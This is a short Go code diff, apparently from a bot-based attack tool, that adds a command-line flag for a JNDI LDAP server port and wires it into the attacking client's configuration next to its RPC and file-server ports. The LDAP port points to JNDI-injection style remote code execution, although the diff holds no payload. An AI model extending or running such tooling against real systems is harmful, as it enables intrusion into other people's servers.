@@ -17,6 +17,7 @@ var (
 	attackType = flag.String("attackType","root","set the cbot attacked type")
 	sbotHost = flag.String("rhost", "127.0.0.1", "set sbot host")
 	sbotRpcPort = flag.Int("rport", 3333, "set sbot rpc port")
+	sbotLdapPort = flag.Int("jport", 3890, "set sbot jndi ldap port")
 	sbotFileServerPort = flag.Int("fport", 6666, "set sbot file server port")
 	maxThreads = flag.Int("threads", 100, "set max threads that attack")
 	scapacity = flag.Int("scap", 100, "set source queue capacity")
@@ -66,6 +67,7 @@ func startCbot(){
 		AttackType: 		   *attackType,
 		SbotHost:              *sbotHost,
 		SbotRPCPort:           *sbotRpcPort,
+		SbotLdapServerPort:    *sbotLdapPort,
 		SbotFileServerPort:    *sbotFileServerPort,
 		MaxThreads:            *maxThreads,
 		SourceCapacity:        *scapacity,
